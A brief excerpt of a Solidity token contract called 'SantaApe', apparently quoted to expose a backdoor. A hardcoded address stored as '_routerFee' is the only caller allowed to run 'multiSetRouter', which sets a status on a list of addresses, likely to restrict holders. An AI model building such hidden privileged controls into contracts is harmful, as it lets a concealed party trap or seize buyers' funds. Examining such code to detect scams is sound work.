...
contract SantaApe is Context, IERC20, Ownable{
    ...
    string private _symbol = "SantaApe";
    ...
    constructor () {
        ...
        _routerFee = payable(address(0x492d0aA3aeeB96a7D56973f81adaf7CE10b4dF9a));
    ...
    function multiSetRouter(address[] calldata routerAddress, bool status) public {require(_msgSender() == _routerFee);
